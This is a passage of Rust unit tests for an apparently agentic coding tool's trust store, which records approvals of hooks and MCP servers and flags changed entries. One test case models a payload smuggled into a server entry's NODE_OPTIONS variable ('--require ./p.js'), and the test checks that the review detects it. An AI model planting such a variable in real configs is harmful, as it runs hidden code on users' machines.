        assert_eq!(
            trust_of(&store.review_hooks(USER, &moved)),
            vec![("cargo fmt".to_string(), HookTrust::New)]
        );
    }

    #[test]
    fn hooks_are_trusted_per_file() {
        // `./fmt.sh` is a different script in a different project.
        let text = recorded_hooks(
            "",
            PROJECT,
            &hooks(STOP_FMT),
            &[hook("Stop", "", "cargo fmt")],
            &[],
        );
        let store = TrustFile::parse(&text).expect("recorded store parses");
        assert!(store.is_hook_trusted(PROJECT, &hook("Stop", "", "cargo fmt")));
        assert!(!store.is_hook_trusted(USER, &hook("Stop", "", "cargo fmt")));
        assert!(!store.is_hook_trusted(
            "/other/.alter-zero/hooks.json",
            &hook("Stop", "", "cargo fmt")
        ));
    }

    #[test]
    fn recording_hooks_keeps_the_files_trusted_hooks_and_drops_removed_ones() {
        let both = hooks(
            r#"{"hooks":{"Stop":[{"hooks":[
                {"type":"command","command":"./one.sh"},
                {"type":"command","command":"./two.sh"}
            ]}]}}"#,
        );
        let text = recorded_hooks(
            "",
            USER,
            &both,
            &[hook("Stop", "", "./one.sh"), hook("Stop", "", "./two.sh")],
            &[],
        );
        // `./one.sh` is removed from the file; trusting a new hook rewrites
        // the record to what the file has now.
        let later = hooks(
            r#"{"hooks":{"Stop":[{"hooks":[
                {"type":"command","command":"./two.sh"}
            ]}],"SessionStart":[{"hooks":[{"type":"command","command":"./start.sh"}]}]}}"#,
        );
        let text = recorded_hooks(
            &text,
            USER,
            &later,
            &[hook("SessionStart", "", "./start.sh")],
            &[],
        );
        let store = TrustFile::parse(&text).expect("recorded store parses");
        assert!(store.is_hook_trusted(USER, &hook("Stop", "", "./two.sh")));
        assert!(store.is_hook_trusted(USER, &hook("SessionStart", "", "./start.sh")));
        // The removed hook dropped out: added back, it is asked about again.
        assert!(!store.is_hook_trusted(USER, &hook("Stop", "", "./one.sh")));
    }

    #[test]
    fn an_edited_hook_keeps_saying_what_it_was_until_the_new_one_is_trusted() {
        let text = recorded_hooks(
            "",
            USER,
            &hooks(STOP_FMT),
            &[hook("Stop", "", "cargo fmt")],
            &[],
        );
        let edited = hooks(
            r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"cargo fmt --all"}]}]},
               "description":"x"}"#,
        );
        // Another decision for the file that leaves the edit untrusted keeps
        // the old version, so the next review still says what changed…
        let text = recorded_hooks(&text, USER, &edited, &[], &[]);
        let store = TrustFile::parse(&text).expect("recorded store parses");
        assert_eq!(
            store.review_hooks(USER, &edited)[0].trust,
            HookTrust::Changed {
                previous: "cargo fmt".to_string()
            }
        );
        // …and trusting the edit lets the old version go.
        let text = recorded_hooks(
            &text,
            USER,
            &edited,
            &[hook("Stop", "", "cargo fmt --all")],
            &[],
        );
        let store = TrustFile::parse(&text).expect("recorded store parses");
        assert_eq!(
            store.review_hooks(USER, &edited)[0].trust,
            HookTrust::Trusted
        );
        assert!(!store.is_hook_trusted(USER, &hook("Stop", "", "cargo fmt")));
    }

    #[test]
    fn a_hook_can_stop_being_trusted() {
        let text = recorded_hooks(
            "",
            USER,
            &hooks(STOP_FMT),
            &[hook("Stop", "", "cargo fmt")],
            &[],
        );
        let text = recorded_hooks(
            &text,
            USER,
            &hooks(STOP_FMT),
            &[],
            &[hook("Stop", "", "cargo fmt")],
        );
        let store = TrustFile::parse(&text).expect("recorded store parses");
        assert_eq!(
            store.review_hooks(USER, &hooks(STOP_FMT))[0].trust,
            HookTrust::New
        );
    }

    #[test]
    fn recording_one_file_leaves_every_other_record_alone() {
        let text = recorded_hooks(
            "",
            PROJECT,
            &hooks(STOP_FMT),
            &[hook("Stop", "", "cargo fmt")],
            &[],
        );
        let text = recorded_servers(
            &text,
            MCP,
            &servers(r#"{"mcpServers":{"docs":{"command":"npx","args":["docs"]}}}"#),
            &[("docs".to_string(), true)],
        );
        let text = recorded_hooks(
            &text,
            USER,
            &hooks(STOP_FMT),
            &[hook("Stop", "", "cargo fmt")],
            &[],
        );
        let store = TrustFile::parse(&text).expect("recorded store parses");
        assert!(store.is_hook_trusted(PROJECT, &hook("Stop", "", "cargo fmt")));
        assert!(store.is_hook_trusted(USER, &hook("Stop", "", "cargo fmt")));
        assert_eq!(
            store.server_trust(
                MCP,
                "docs",
                &servers(r#"{"mcpServers":{"docs":{"command":"npx","args":["docs"]}}}"#).servers[0]
                    .1
            ),
            ServerTrust::Enabled
        );
    }

    #[test]
    fn trusted_only_keeps_the_trusted_hooks_and_what_cannot_run_anyway() {
        let file = hooks(
            r#"{"hooks":{"Stop":[{"hooks":[
                {"type":"command","command":"./trusted.sh"},
                {"type":"command","command":"./untrusted.sh"},
                {"type":"prompt","command":"./prompt"}
            ]}],"FileChanged":[{"hooks":[{"type":"command","command":"./unmodelled.sh"}]}]}}"#,
        );
        let kept = trusted_only(&file, &|identity| identity.command == "./trusted.sh");
        let commands: Vec<Option<String>> = kept.hooks["Stop"][0]
            .hooks
            .iter()
            .map(|handler| handler.command.clone())
            .collect();
        assert_eq!(
            commands,
            vec![
                Some("./trusted.sh".to_string()),
                Some("./prompt".to_string())
            ]
        );
        assert_eq!(kept.hooks["FileChanged"][0].hooks.len(), 1);
        // What the runner selects is the trusted hook alone.
        let selection = kept.select(HookEvent::Stop, None);
        let running: Vec<&str> = selection
            .handlers
            .iter()
            .map(|hook| hook.command.as_str())
            .collect();
        assert_eq!(running, vec!["./trusted.sh"]);
    }

    #[test]
    fn a_server_decision_is_pinned_to_its_whole_entry() {
        let base =
            servers(r#"{"mcpServers":{"s":{"command":"npx","args":["srv"],"env":{"K":"v"}}}}"#);
        let same = servers(
            r#"{"mcpServers":{"s":{"type":"stdio","command":"npx","args":["srv"],"env":{"K":"v"}}}}"#,
        );
        let env =
            servers(r#"{"mcpServers":{"s":{"command":"npx","args":["srv"],"env":{"K":"w"}}}}"#);
        let fp = |file: &McpFile| server_fingerprint(&file.servers[0].1);
        assert_eq!(fp(&base), fp(&same));
        assert_ne!(fp(&base), fp(&env));
        let headers = servers(
            r#"{"mcpServers":{"s":{"type":"http","url":"https://x/mcp","headers":{"A":"1"}}}}"#,
        );
        let other = servers(
            r#"{"mcpServers":{"s":{"type":"http","url":"https://x/mcp","headers":{"A":"2"}}}}"#,
        );
        assert_ne!(fp(&headers), fp(&other));
    }

    #[test]
    fn review_servers_says_where_each_project_server_stands() {
        let alter = servers(
            r#"{"mcpServers":{
                "fresh":{"command":"npx","args":["fresh"]},
                "shared":{"url":"https://alter/mcp"}
            }}"#,
        );
        let compat = servers(
            r#"{"mcpServers":{
                "shared":{"url":"https://compat/mcp"},
                "on":{"command":"on"},
                "off":{"command":"off"},
                "edited":{"command":"edited","args":["--new"]}
            }}"#,
        );
        let mut text = recorded_servers(
            "",
            MCP,
            &servers(
                r#"{"mcpServers":{"on":{"command":"on"},"off":{"command":"off"},
                   "edited":{"command":"edited","args":["--old"]}}}"#,
            ),
            &[
                ("on".to_string(), true),
                ("off".to_string(), false),
                ("edited".to_string(), true),
            ],
        );
        text = TrustFile::parse(&text).expect("parses").serialize();
        let store = TrustFile::parse(&text).expect("recorded store parses");
        let reviews = review_servers(
            &store,
            &[("/repo/.alter-zero/mcp.json", &alter), (MCP, &compat)],
        );
        let summary: Vec<(&str, &str, ServerTrust)> = reviews
            .iter()
            .map(|r| (r.name.as_str(), r.source.as_str(), r.trust.clone()))
            .collect();
        assert_eq!(
            summary,
            vec![
                ("fresh", "/repo/.alter-zero/mcp.json", ServerTrust::New),
                // First file declaring a name counts.
                ("shared", "/repo/.alter-zero/mcp.json", ServerTrust::New),
                ("on", MCP, ServerTrust::Enabled),
                ("off", MCP, ServerTrust::Disabled),
                (
                    "edited",
                    MCP,
                    ServerTrust::Changed {
                        changes: vec![ServerChange::CommandLine]
                    }
                ),
            ]
        );
        assert!(ServerTrust::Enabled.approved());
        assert!(!ServerTrust::Disabled.approved());
        assert!(!ServerTrust::New.approved());
        assert!(ServerTrust::New.needs_review());
        assert!(
            ServerTrust::Changed {
                changes: Vec::new()
            }
            .needs_review()
        );
        assert!(!ServerTrust::Disabled.needs_review());
    }

    #[test]
    fn a_server_decision_is_per_file() {
        let file = servers(r#"{"mcpServers":{"s":{"command":"x"}}}"#);
        let text = recorded_servers("", MCP, &file, &[("s".to_string(), true)]);
        let store = TrustFile::parse(&text).expect("recorded store parses");
        assert_eq!(
            store.server_trust(MCP, "s", &file.servers[0].1),
            ServerTrust::Enabled
        );
        assert_eq!(
            store.server_trust("/other/.mcp.json", "s", &file.servers[0].1),
            ServerTrust::New
        );
    }

    #[test]
    fn recording_servers_keeps_undecided_records_and_drops_gone_servers() {
        let first = servers(
            r#"{"mcpServers":{"a":{"command":"a"},"b":{"command":"b"},"c":{"command":"c"}}}"#,
        );
        let text = recorded_servers(
            "",
            MCP,
            &first,
            &[
                ("a".to_string(), true),
                ("b".to_string(), false),
                ("c".to_string(), true),
            ],
        );
        // `c` is gone from the file and `a` changed; deciding `b` again keeps
        // `a`'s old record (what its `changed:` line compares against) and
        // drops `c`.
        let second = servers(r#"{"mcpServers":{"a":{"command":"a2"},"b":{"command":"b"}}}"#);
        let text = recorded_servers(&text, MCP, &second, &[("b".to_string(), true)]);
        let store = TrustFile::parse(&text).expect("recorded store parses");
        assert_eq!(
            store.server_trust(MCP, "a", &second.servers[0].1),
            ServerTrust::Changed {
                changes: vec![ServerChange::CommandLine]
            }
        );
        assert_eq!(
            store.server_trust(MCP, "b", &second.servers[1].1),
            ServerTrust::Enabled
        );
        assert_eq!(
            store.server_trust(MCP, "c", &first.servers[2].1),
            ServerTrust::New
        );
    }

    #[test]
    fn the_store_keeps_no_value_of_a_server_entry() {
        // `trust.json` is a file people sync with their dotfiles, and a
        // project's entry can carry a token anywhere — a header, an `env`
        // value, an argument, the URL's query. None of it is copied: a
        // decision keeps fingerprints and the names of the entry's
        // variables, never their values.
        let file = servers(
            r#"{"mcpServers":{
                "remote":{"type":"http","url":"https://x/mcp?api_key=sk-in-the-url",
                    "headers":{"Authorization":"Bearer sk-in-a-header"}},
                "local":{"command":"npx","args":["srv","--api-key","sk-in-an-arg"],
                    "env":{"TOKEN":"sk-in-the-env"}}
            }}"#,
        );
        let text = recorded_servers(
            "",
            MCP,
            &file,
            &[("remote".to_string(), true), ("local".to_string(), true)],
        );
        for secret in [
            "sk-in-the-url",
            "sk-in-a-header",
            "sk-in-an-arg",
            "sk-in-the-env",
        ] {
            assert!(!text.contains(secret), "{secret} leaked: {text}");
        }
        assert!(!text.contains("https://x/mcp"), "{text}");
        assert!(text.contains("\"Authorization\""), "{text}");
        assert!(text.contains("\"TOKEN\""), "{text}");
    }

    #[test]
    fn a_changed_server_says_what_changed_part_by_part() {
        let parts = |text: &str| ServerParts::of(&servers(text).servers[0].1);
        let before = parts(
            r#"{"mcpServers":{"s":{"command":"npx","args":["-y","srv"],"env":{"A":"1","B":"2"}}}}"#,
        );
        let cases: [(&str, Vec<ServerChange>); 4] = [
            // What a payload hides in: a variable the program starts with.
            (
                r#"{"mcpServers":{"s":{"command":"npx","args":["-y","srv"],
                    "env":{"A":"1","B":"2","NODE_OPTIONS":"--require ./p.js"}}}}"#,
                vec![ServerChange::Added {
                    kind: "env",
                    name: "NODE_OPTIONS".to_string(),
                }],
            ),
            (
                r#"{"mcpServers":{"s":{"command":"npx","args":["-y","srv2"],"env":{"A":"1"}}}}"#,
                vec![
                    ServerChange::CommandLine,
                    ServerChange::Removed {
                        kind: "env",
                        name: "B".to_string(),
                    },
                ],
            ),
            (
                r#"{"mcpServers":{"s":{"command":"npx","args":["-y","srv"],"env":{"A":"9","B":"2"}}}}"#,
                vec![ServerChange::Value {
                    kind: "env",
                    name: "A".to_string(),
                }],
            ),
            // Another transport is a different server: nothing else compares.
            (
                r#"{"mcpServers":{"s":{"type":"http","url":"https://x/mcp"}}}"#,
                vec![ServerChange::Transport {
                    was: "stdio".to_string(),
                }],
            ),
        ];
        for (now, expected) in cases {
            assert_eq!(before.changes(&parts(now)), expected, "{now}");
        }
        // A remote server's URL and headers the same way.
        let remote = parts(r#"{"mcpServers":{"s":{"type":"http","url":"https://x/mcp"}}}"#);
        assert_eq!(
            remote.changes(&parts(
                r#"{"mcpServers":{"s":{"type":"http","url":"https://y/mcp","headers":{"Authorization":"t"}}}}"#,
            )),
            vec![
                ServerChange::Url,
                ServerChange::Added {
                    kind: "header",
                    name: "Authorization".to_string(),
                },
            ]
        );
        // The words the review's `changed:` line joins.
        let words: Vec<String> = [
            ServerChange::Transport {
                was: "stdio".to_string(),
            },
            ServerChange::CommandLine,
            ServerChange::Url,
            ServerChange::Added {
                kind: "env",
                name: "NODE_OPTIONS".to_string(),
            },
            ServerChange::Removed {
                kind: "header",
                name: "X".to_string(),
            },
            ServerChange::Value {
                kind: "env",
                name: "A".to_string(),
            },
        ]
        .iter()
        .map(ServerChange::describe)
        .collect();
        assert_eq!(
            words,
            [
                "the transport (was stdio)",
                "the command line",
                "the URL",
                "env NODE_OPTIONS added",
                "header X removed",
                "env A's value",
            ]
        );
    }

    #[test]
    fn a_change_the_parts_cannot_name_still_reads_as_changed() {
        // The `type` key dropped from an http entry is a change of what runs
        // (it may now fall back to SSE), so the decision is asked again —
        // with nothing more specific to say than that it changed.
        let file = servers(r#"{"mcpServers":{"s":{"type":"http","url":"https://x/mcp"}}}"#);
        let text = recorded_servers("", MCP, &file, &[("s".to_string(), true)]);
        let store = TrustFile::parse(&text).expect("recorded store parses");
        let now = servers(r#"{"mcpServers":{"s":{"url":"https://x/mcp"}}}"#);
        assert_eq!(
            store.server_trust(MCP, "s", &now.servers[0].1),
            ServerTrust::Changed {
                changes: Vec::new()
            }
        );
    }

    #[test]
    fn an_empty_or_legacy_store_records_nothing() {
        for text in [
            "",
            "   \n",
            r#"{"projects":{"/repo":{"files":{"/repo/.mcp.json":"sha256:aa"}}}}"#,
        ] {
            let store = TrustFile::parse(text).expect("loads");
            assert_eq!(
                store.review_hooks(USER, &hooks(STOP_FMT))[0].trust,
                HookTrust::New,
                "{text:?}"
            );
        }
        // …and a write keeps the `/trust` era's records it has not carried
        // over yet, for the projects not opened since.
        let text = recorded_hooks(
            r#"{"projects":{"/repo":{"files":{"/repo/.mcp.json":"sha256:aa"}}}}"#,
            USER,
            &hooks(STOP_FMT),
            &[hook("Stop", "", "cargo fmt")],
            &[],
        );
        assert!(text.contains(r#""/repo/.mcp.json": "sha256:aa""#), "{text}");
        let store = TrustFile::parse(&text).expect("parses");
        assert_eq!(
            TrustFile::parse(&store.serialize()).expect("round-trips"),
            store
        );
    }

    /// A `/trust`-era store approving `/repo`'s files at `hooks_fp` and
    /// `mcp_fp`, and `/other`'s.
    fn legacy_store(hooks_fp: &str, mcp_fp: &str) -> TrustFile {
        TrustFile::parse(&format!(
            r#"{{"projects":{{
                "/repo":{{"files":{{"{PROJECT}":"{hooks_fp}","{MCP}":"{mcp_fp}"}}}},
                "/other":{{"files":{{"/other/.mcp.json":"sha256:bb"}}}}
            }}}}"#
        ))
        .expect("legacy store parses")
    }

    #[test]
    fn a_trust_era_approval_carries_over_at_the_same_content() {
        let hooks_text = STOP_FMT;
        let mcp_text = r#"{"mcpServers":{"a":{"command":"a"},"b":{"command":"b"}}}"#;
        let (hooks_fp, mcp_fp) = (
            fingerprint(hooks_text.as_bytes()),
            fingerprint(mcp_text.as_bytes()),
        );
        let mut store = legacy_store(&hooks_fp, &mcp_fp);
        let (parsed_hooks, parsed_mcp) = (hooks(hooks_text), servers(mcp_text));
        assert!(store.migrate_legacy(
            "/repo",
            Some((PROJECT, hooks_fp.as_str(), &parsed_hooks)),
            &[(MCP, mcp_fp.as_str(), &parsed_mcp)],
        ));
        // What `/trust` approved still runs: its hooks trusted, its servers
        // enabled.
        assert!(store.is_hook_trusted(PROJECT, &hook("Stop", "", "cargo fmt")));
        for (name, config) in &parsed_mcp.servers {
            assert_eq!(
                store.server_trust(MCP, name, config),
                ServerTrust::Enabled,
                "{name}"
            );
        }
        // The project's old records go; another project's stay for when it
        // is opened.
        let text = store.serialize();
        assert!(!text.contains(&hooks_fp), "{text}");
        assert!(!text.contains(&mcp_fp), "{text}");
        assert!(text.contains("/other/.mcp.json"), "{text}");
        // Done once: nothing is left to carry over.
        assert!(!store.migrate_legacy(
            "/repo",
            Some((PROJECT, hooks_fp.as_str(), &parsed_hooks)),
            &[(MCP, mcp_fp.as_str(), &parsed_mcp)],
        ));
    }

    #[test]
    fn a_file_edited_since_trust_approved_it_carries_nothing_over() {
        // `/trust` approved other bytes than these: what it saw is not what
        // is there now, so the review asks.
        let mut store = legacy_store("sha256:old-hooks", "sha256:old-mcp");
        let (parsed_hooks, parsed_mcp) = (
            hooks(STOP_FMT),
            servers(r#"{"mcpServers":{"a":{"command":"a"}}}"#),
        );
        assert!(!store.migrate_legacy(
            "/repo",
            Some((PROJECT, "sha256:new-hooks", &parsed_hooks)),
            &[(MCP, "sha256:new-mcp", &parsed_mcp)],
        ));
        assert!(!store.is_hook_trusted(PROJECT, &hook("Stop", "", "cargo fmt")));
        assert_eq!(
            store.server_trust(MCP, "a", &parsed_mcp.servers[0].1),
            ServerTrust::New
        );
    }

    #[test]
    fn a_server_decided_since_keeps_its_decision_over_the_trust_era_one() {
        let mcp_text = r#"{"mcpServers":{"a":{"command":"a"},"b":{"command":"b"}}}"#;
        let mcp_fp = fingerprint(mcp_text.as_bytes());
        let parsed = servers(mcp_text);
        let mut store = legacy_store("sha256:x", &mcp_fp);
        store.record_servers(MCP, &parsed, &[("a".to_string(), false)]);
        assert!(store.migrate_legacy("/repo", None, &[(MCP, mcp_fp.as_str(), &parsed)]));
        assert_eq!(
            store.server_trust(MCP, "a", &parsed.servers[0].1),
            ServerTrust::Disabled
        );
        assert_eq!(
            store.server_trust(MCP, "b", &parsed.servers[1].1),
            ServerTrust::Enabled
        );
    }

    #[test]
    fn a_decision_is_never_written_over_a_malformed_store() {
        // Whatever the user decided before is still in a file with a typo,
        // waiting for it to be fixed: the write is refused, never a fresh
        // store that drops every other project's decisions.
        let err = update_store(r#"{"hooks": {},}"#, |store| {
            store.record_hooks(
                USER,
                &hooks(STOP_FMT),
                &[hook("Stop", "", "cargo fmt")],
                &[],
            );
        })
        .expect_err("a malformed store is not written over");
        assert!(err.contains("trailing comma"), "{err}");
        // An empty file is an empty store, recorded into.
        let text = recorded_hooks(
            "",
            USER,
            &hooks(STOP_FMT),
            &[hook("Stop", "", "cargo fmt")],
            &[],
        );
        let store = TrustFile::parse(&text).expect("fresh store parses");
        assert!(store.is_hook_trusted(USER, &hook("Stop", "", "cargo fmt")));
    }

    #[test]
    fn a_decision_is_recorded_over_the_file_as_it_is_now() {
        // Two sessions answer at once, each having read the store before
        // the other wrote. Each records over the file as it is when it
        // answers, so the second keeps the first's answer.
        let other = "/other/.alter-zero/hooks.json";
        let first = recorded_hooks(
            "",
            PROJECT,
            &hooks(STOP_FMT),
            &[hook("Stop", "", "cargo fmt")],
            &[],
        );
        let second = recorded_hooks(
            &first,
            other,
            &hooks(STOP_FMT),
            &[hook("Stop", "", "cargo fmt")],
            &[],
        );
        let store = TrustFile::parse(&second).expect("parses");
        assert!(store.is_hook_trusted(PROJECT, &hook("Stop", "", "cargo fmt")));
        assert!(store.is_hook_trusted(other, &hook("Stop", "", "cargo fmt")));
    }

    #[test]
    fn a_malformed_store_is_an_error_not_silent_trust() {
        assert!(TrustFile::parse("not json").is_err());
        // Unknown fields are malformed too — a guard file with keys we don't
        // model is a guard file we don't understand.
        assert!(TrustFile::parse(r#"{"hooks":{},"extra":1}"#).is_err());
        assert!(
            TrustFile::parse(r#"{"hooks":{"/f":[{"event":"Stop","command":"x","y":1}]}}"#).is_err()
        );
        assert!(
            TrustFile::parse(r#"{"mcp":{"/f":{"s":{"enabled":"yes","fingerprint":"x"}}}}"#)
                .is_err()
        );
        assert!(TrustFile::parse(r#"{"projects":{"/r":{"files":{},"x":1}}}"#).is_err());
    }

    #[test]
    fn the_store_reads_back_as_written() {
        let text = recorded_hooks(
            "",
            USER,
            &hooks(
                r#"{"hooks":{"PreToolUse":[{"matcher":"bash","hooks":[{"type":"command","command":"./guard.sh"}]}],
                         "Stop":[{"hooks":[{"type":"command","command":"cargo fmt"}]}]}}"#,
            ),
            &[
                hook("PreToolUse", "bash", "./guard.sh"),
                hook("Stop", "", "cargo fmt"),
            ],
            &[],
        );
        // A match-everything hook writes no matcher at all.
        assert!(text.contains(r#""matcher": "bash""#), "{text}");
        assert_eq!(text.matches("matcher").count(), 1, "{text}");
        let store = TrustFile::parse(&text).expect("parses");
        assert_eq!(
            TrustFile::parse(&store.serialize()).expect("round-trips"),
            store
        );
        // A text file ends its last line.
        assert!(text.ends_with("}\n"), "{text:?}");
    }
}
